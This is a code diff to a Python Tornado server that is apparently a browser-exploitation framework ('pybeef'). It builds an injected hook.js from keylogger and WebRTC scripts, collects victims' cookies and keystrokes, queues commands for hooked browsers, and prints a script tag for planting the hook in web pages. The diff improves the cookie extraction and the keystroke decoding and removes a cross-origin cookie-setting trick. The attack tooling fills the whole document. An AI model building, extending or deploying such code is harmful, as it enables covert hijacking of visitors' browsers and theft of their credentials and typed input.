@@ -3,6 +3,7 @@
 import os.path
 import sys
 import json
+import time
 
 import tornado.httpserver
 import tornado.ioloop
@@ -17,6 +18,15 @@ import pymongo
 
 import tornado.websocket
 
+# for init config 
+import socket
+import fcntl
+import struct
+import os   
+import fileinput
+import subprocess 
+import re 
+
 cmd = ''
 cmd_id = ''
 
@@ -28,18 +38,12 @@ def acount_info():
     password = config['acount']['password']
     return username,password
 
-def database_init():
-    data_path = sys.path[0]+'/data'
-    os.system('mongod --dbpath '+data_path+' >> '+data_path+'/db.log')
 
 class Application(tornado.web.Application):
     def __init__(self):
         handlers=[(r'/', IndexHandler),
                 (r'/shell', LoginPageHandler),
                 (r'/hook.js',HookHandler),
-                (r'/ws',EchoWebSocket),
-#                (r'/hello',HelloHandler),
-                (r'/cookie',SetCookieHandler),
                 (r'/hook_tree',TreeHandler),
                 (r'/poll',PollHandler),
                 (r'/command',CommandHandler),
@@ -53,7 +57,7 @@ class Application(tornado.web.Application):
         "cookie_secret":"61oETzKXQAGaYdkL5gEmGeJJFuYh7EQnp2XdTP1o/Vo=",
         }
         
-#        database_init()
+
         tornado.web.Application.__init__(self,handlers,**setting)
 
 define("port", default=8000, help="run on the given port", type=int)
@@ -93,25 +97,6 @@ class LoginPageHandler(tornado.web.RequestHandler):
             self.render('shell.html')
 
 
-class EchoWebSocket(tornado.websocket.WebSocketHandler):
-    def open(self):
-        print "websocket open"
-    
-    def on_message(self,message):
-        self.write_message("alert(1);")
-
-    def on_close(self):
-        print "websocket close"
-    
-    def check_origin(self,origin):
-        return True
-
-#for firefox cross orign cookie set bug 
-class SetCookieHandler(tornado.web.RequestHandler):
-    def get(self):
-        self.redirect("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><circle r='100'></circle><foreignObject><html xmlns='http://www.w3.org/1999/xhtml'><meta http-equiv='Set-Cookie' content='ppp=aaa' /></html></foreignObject></svg>")
-
-
 #return hook browser list with json 
 
 class TreeHandler(tornado.web.RequestHandler):
@@ -148,8 +133,8 @@ class PollHandler(tornado.web.RequestHandler):
         post_body=self.request.body
         f1=post_body.index("cookies=")
         f2=post_body.find("&",f1)
-        cookies=post_body[f1:f2]
-        
+        cookies=post_body[f1+8:f2]
+
 
         client = pymongo.MongoClient("mongodb://localhost:27017")
         db = client.hookbrowser
@@ -186,7 +171,7 @@ class CommandHandler(tornado.web.RequestHandler):
         cmd = self.get_argument('cmd')
         cmd_id = self.get_argument('cmd_id')
 
-key_result=''
+
 
 class LogHandler(tornado.web.RequestHandler):
     def post(self):
@@ -199,13 +184,13 @@ class LogHandler(tornado.web.RequestHandler):
 
         print hook_id
 
-        global key_result
+        key_result=''
         key_map = {'1':'!','2':'@','3':'#','4':'$','5':'%','6':'^','7':'&','8':'*','9':'(','10':')',
         "-":"_","=":"+",",":"<",".":">","/":"?","[":"{","]":"}",
         }
         self.set_header('Access-Control-Allow-Origin','*')
         key_data = json.loads(self.request.body)
-        print key_data
+        print key_data  
         for i in key_data:
             if i['modify']['shift']:
                 try:
@@ -213,6 +198,10 @@ class LogHandler(tornado.web.RequestHandler):
                     key_result+=res
                 except Exception, e:
                     pass
+                if i['code']>=65 and i['code']<=90:
+                    key_result+=chr(i['code'])
+            elif i['code']>=65 and i['code']<=90:
+                key_result+=chr(i['code']).lower()
             else:
                 key_result+=chr(i['code'])
 
@@ -286,15 +275,9 @@ ipcreate(target_ip);
             scan_result = ''
 
 
-import socket
-import fcntl
-import struct
-import os   
-import fileinput
-import subprocess 
-import re 
 
-#current_path = os.path.abspath('.')
+
+
 hook_path = "/root/pybeef/templates/static/hook.js"
 current_path = os.path.abspath('.')
 def get_ip_address(ifname):
@@ -315,7 +298,7 @@ def start_database():
 def config_hook(ip):
     for line in fileinput.input(hook_path,inplace=True):
         p = re.search(r"\d+\.\d+\.\d+\.\d+",line)
-        if p:
+        if p and p.group()!="0.0.0.0":
             print line.replace(p.group(),ip),
         else:
             print line,
@@ -325,8 +308,8 @@ def gen_hook():
     os.chdir("/root/pybeef/templates/static/")
     fp_hook = open('hook.js','w')
     fp_hook.truncate()
-    for file_name in ['jquery-3.1.1.js','request.js','webrtc.js','pybeef.js',
-    'browser_me.js','keylogger.js']:
+    for file_name in ['jquery-3.1.1.js','webrtc.js','pybeef.js',
+    'browser_me.js','keylogger.js','request.js']:
         with open(file_name) as f:
             f_js = f.read()
         fp_hook.write(f_js)
@@ -342,15 +325,17 @@ def beef_init():
 
     print "config hook.js"
     config_hook(ip)
-    
-    print "exit"
+    os.chdir('/root/pybeef/')
+    time.sleep(2)
+    print "/************************************************/"
+    print "将以下代码插入到页面中:"
+    print "<script src='http://"+ip+":8000/hook.js'></script>"
 
 if __name__ == '__main__':
     beef_init()
     tornado.options.parse_command_line()
     http_server = tornado.httpserver.HTTPServer(Application())
     http_server.listen(options.port)
-    
-    print "Listening on localhost and port is "+str(options.port) 
+     
     tornado.ioloop.IOLoop.instance().start()
 
